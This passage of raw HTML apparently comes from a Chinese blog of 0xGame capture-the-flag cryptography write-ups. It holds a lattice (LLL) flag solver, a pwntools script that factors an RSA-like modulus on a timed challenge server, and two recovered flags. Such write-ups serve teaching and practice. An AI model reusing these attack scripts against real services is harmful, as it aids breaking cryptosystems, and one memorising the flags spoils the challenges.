class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">from</span> fpylll <span class=\"keyword\">import</span> IntegerMatrix, LLL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    主解决函数，读取矩阵，运行 LLL 算法并寻找 Flag。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 1. 解析 output.txt 文件</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;output.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            content = f.read()</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用 ast.literal_eval 安全地将文件内容（字符串形式的列表）转换为 Python 对象</span></span><br><span class=\"line\">        matrix_C = ast.literal_eval(content)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 确保我们得到的是一个矩阵（列表的列表）</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(matrix_C, <span class=\"built_in\">list</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> <span class=\"built_in\">all</span>(<span class=\"built_in\">isinstance</span>(row, <span class=\"built_in\">list</span>) <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> matrix_C):</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;文件内容不是一个有效的矩阵（列表的列表）&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 读取或解析 output.txt 时出错: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 请确保 output.txt 与脚本在同一目录，且内容为有效的矩阵格式，例如 [[1, 2], [3, 4]]。&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 第一次尝试：直接使用原始矩阵的行向量作为基 ---</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--- 尝试 1: 使用原始矩阵 C 的行向量 ---&quot;</span>)</span><br><span class=\"line\">    found_flag = find_flag_in_basis(matrix_C)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_flag:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[+] 成功找到 Flag: <span class=\"subst\">&#123;found_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 在原始矩阵的基中未找到 Flag。&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 第二次尝试：根据提示，使用转置矩阵的行向量作为基 ---</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--- 尝试 2: 使用转置矩阵 C^T 的行向量 ---&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        rows = <span class=\"built_in\">len</span>(matrix_C)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> rows == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 矩阵为空。&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        cols = <span class=\"built_in\">len</span>(matrix_C[<span class=\"number\">0</span>])</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 计算转置矩阵</span></span><br><span class=\"line\">        transposed_C = [[matrix_C[j][i] <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(rows)] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cols)]</span><br><span class=\"line\">        </span><br><span class=\"line\">        found_flag = find_flag_in_basis(transposed_C)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> found_flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[+] 成功找到 Flag: <span class=\"subst\">&#123;found_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 在进行第二次尝试时出错: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 在转置矩阵的基中也未找到 Flag。&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] 解密失败。正如提示所说，可能需要构建一个更复杂的格结构。&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_flag_in_basis</span>(<span class=\"params\">basis_matrix</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    对给定的基矩阵进行 LLL 规约，并从中寻找 Flag。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        basis_matrix (list of lists): 作为格的基的矩阵。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        str: 如果找到 Flag，则返回 Flag 字符串，否则返回 None。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 2. 构造格的基</span></span><br><span class=\"line\">        n = <span class=\"built_in\">len</span>(basis_matrix)</span><br><span class=\"line\">        B = IntegerMatrix.from_matrix(basis_matrix)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 3. 运行 LLL 算法进行规约</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 正在对一个 <span class=\"subst\">&#123;n&#125;</span>x<span class=\"subst\">&#123;n&#125;</span> 的矩阵进行 LLL 规约...&quot;</span>)</span><br><span class=\"line\">        B_reduced = LLL.reduction(B)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] LLL 规约完成。&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 4. 分析规约后的基向量</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在分析规约后的短向量...&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">            <span class=\"comment\"># 获取一个规约后的向量 v</span></span><br><span class=\"line\">            v = <span class=\"built_in\">list</span>(B_reduced[i])</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 5. 尝试从向量 v 中恢复 Flag</span></span><br><span class=\"line\">            <span class=\"comment\"># 向量 v 可能是 flag 向量的整数倍 k*f。通过计算最大公约数（GCD）来找到 k。</span></span><br><span class=\"line\">            non_zero_elements = [<span class=\"built_in\">abs</span>(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> v <span class=\"keyword\">if</span> x != <span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> non_zero_elements:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>  <span class=\"comment\"># 跳过零向量</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 计算所有非零元素的 GCD</span></span><br><span class=\"line\">            common_divisor = non_zero_elements[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">len</span>(non_zero_elements)):</span><br><span class=\"line\">                common_divisor = math.gcd(common_divisor, non_zero_elements[j])</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># LLL 找到的向量方向可能相反，所以要同时尝试 k 和 -k</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> sign <span class=\"keyword\">in</span> [<span class=\"number\">1</span>, -<span class=\"number\">1</span>]:</span><br><span class=\"line\">                k = common_divisor * sign</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 用向量 v 除以 k，得到 flag 候选</span></span><br><span class=\"line\">                    f_candidate = [x // k <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> v]</span><br><span class=\"line\">                    </span><br><span class=\"line\">                    <span class=\"comment\"># 检查候选向量的所有元素是否都在0-127的 ASCII 范围内</span></span><br><span class=\"line\">                    is_ascii = <span class=\"built_in\">all</span>(<span class=\"number\">0</span> &lt; x &lt; <span class=\"number\">128</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> f_candidate)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> is_ascii:</span><br><span class=\"line\">                        flag_str = <span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">chr</span>, f_candidate))</span><br><span class=\"line\">                        <span class=\"comment\"># 检查是否符合已知的 flag 格式</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> flag_str.startswith(<span class=\"string\">&quot;0xGame&#123;&quot;</span>) <span class=\"keyword\">and</span> flag_str.endswith(<span class=\"string\">&quot;&#125;&quot;</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">                <span class=\"keyword\">except</span> (ZeroDivisionError, TypeError):</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 错误：未找到 fpylll 库。&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 请使用 &#x27;pip install fpylll&#x27; 命令进行安装。&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># Exit the whole script if the library is missing</span></span><br><span class=\"line\">        exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[-] 在 LLL 规约或分析过程中发生错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;B3g1nn3r_t0_1e4rn_L4tt1c3s&#125;</code></p>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sage</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> remote</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> log <span class=\"keyword\">as</span> pwnlog</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class=\"number\">34782</span>)</span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Connection established. Timer has started. Executing...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 1. 快速解析服务器输出 ---</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;Coordinate of P is (&#x27;</span>)</span><br><span class=\"line\">    p1_str = io.recvuntil(<span class=\"string\">b&#x27;)&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    px1, py1 = <span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, p1_str.split(<span class=\"string\">b&#x27;,&#x27;</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;Coordinate of P is (&#x27;</span>)</span><br><span class=\"line\">    p2_str = io.recvuntil(<span class=\"string\">b&#x27;)&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    px2, py2 = <span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, p2_str.split(<span class=\"string\">b&#x27;,&#x27;</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;n = &#x27;</span>)</span><br><span class=\"line\">    n_str = io.recvuntil(<span class=\"string\">b&#x27;\\n[-]&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(n_str)</span><br><span class=\"line\">    e = <span class=\"number\">65537</span></span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;Data parsed.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 2. 快速分解 n ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Factoring n...&quot;</span>)</span><br><span class=\"line\">    A1 = (<span class=\"built_in\">pow</span>(py1, <span class=\"number\">2</span>, n) - <span class=\"built_in\">pow</span>(px1, <span class=\"number\">3</span>, n)) % n</span><br><span class=\"line\">    A2 = (<span class=\"built_in\">pow</span>(py2, <span class=\"number\">2</span>, n) - <span class=\"built_in\">pow</span>(px2, <span class=\"number\">3</span>, n)) % n</span><br><span class=\"line\">    delta_A = (A1 - A2) % n</span><br><span class=\"line\">    f1 = gcd(delta_A, n)</span><br><span class=\"line\">    f2 = n // f1</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;n factored into two factors.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 3. 根据超奇异条件确定 p 和 q ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Identifying p and q based on supersingular conditions...&quot;</span>)</span><br><span class=\"line\">    p, q = <span class=\"literal\">None</span>, <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f1 % <span class=\"number\">3</span> == <span class=\"number\">2</span> <span class=\"keyword\">and</span> f2 % <span class=\"number\">4</span> == <span class=\"number\">3</span>:</span><br><span class=\"line\">        p, q = f1, f2</span><br><span class=\"line\">        pwnlog.success(<span class=\"string\">&quot;Assignment found: p = factor1 (p%3=2), q = factor2 (q%4=3).&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> f2 % <span class=\"number\">3</span> == <span class=\"number\">2</span> <span class=\"keyword\">and</span> f1 % <span class=\"number\">4</span> == <span class=\"number\">3</span>:</span><br><span class=\"line\">        p, q = f2, f1</span><br><span class=\"line\">        pwnlog.success(<span class=\"string\">&quot;Assignment found: p = factor2 (p%3=2), q = factor1 (q%4=3).&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        pwnlog.failure(<span class=\"string\">&quot;Factors do not meet the expected supersingular conditions. Attack failed.&quot;</span>)</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 4. 瞬时计算阶和求解 ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Calculating orders and solving discrete logs...&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 阶的计算现在是 O(1)</span></span><br><span class=\"line\">    Np = p + <span class=\"number\">1</span></span><br><span class=\"line\">    Nq = q + <span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 在 GF(p) 上求解</span></span><br><span class=\"line\">    Fp = GF(p)</span><br><span class=\"line\">    Ep = EllipticCurve(Fp, [<span class=\"number\">0</span>, q])</span><br><span class=\"line\">    dp = inverse_mod(e, Np)</span><br><span class=\"line\">    P1_p = Ep(px1, py1)</span><br><span class=\"line\">    Q1_p = dp * P1_p</span><br><span class=\"line\">    x_mod_p = Q1_p[<span class=\"number\">0</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 在 GF(q) 上求解</span></span><br><span class=\"line\">    Fq = GF(q)</span><br><span class=\"line\">    Eq = EllipticCurve(Fq, [p, <span class=\"number\">0</span>])</span><br><span class=\"line\">    dq = inverse_mod(e, Nq)</span><br><span class=\"line\">    P1_q = Eq(px1, py1)</span><br><span class=\"line\">    Q1_q = dq * P1_q</span><br><span class=\"line\">    x_mod_q = Q1_q[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 5. 合并结果并立即发送 ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Combining results with CRT and sending secret...&quot;</span>)</span><br><span class=\"line\">    x = crt([Integer(x_mod_p), Integer(x_mod_q)], [p, q])</span><br><span class=\"line\">    secret_bytes = x.to_bytes(<span class=\"number\">126</span>, <span class=\"string\">&#x27;big&#x27;</span>)[:<span class=\"number\">35</span>]</span><br><span class=\"line\">    secret_hex = secret_bytes.<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">f&quot;Secret recovered (hex): <span class=\"subst\">&#123;secret_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&#x27;[-] Give me the secret:&#x27;</span>, secret_hex.encode())</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = io.recvall().decode(errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;Received response:\\n&quot;</span> + flag)</span><br><span class=\"line\">    io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>由于题目有时间限制，所以按常规对素数的解法会超时，所以我们取素数是超奇异数这一特殊情况，能够加快运算，并能够及时通过pwn把计算出的secret发送给服务器，实现交互，得到flag。</p>\n<p>但其实实际上容器生成的随机素数并不全是超奇异数，所以实际需要多运行几次，若容器返回的刚好是超奇异数，就能打通了。</p>\n<p>flag：<code> 0xGame&#123;cab11ca1-2615-4353-8bdc-83acfbc158d9&#125;</code></p>\n<h2 id=\"变化的公钥\"><a href=\"#变化的公钥\" class=\"headerlink\" title=\"变化的公钥\"></a>变化的公钥</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 您提供的数据 =========</span></span><br><span class=\"line\">c_flag = <span 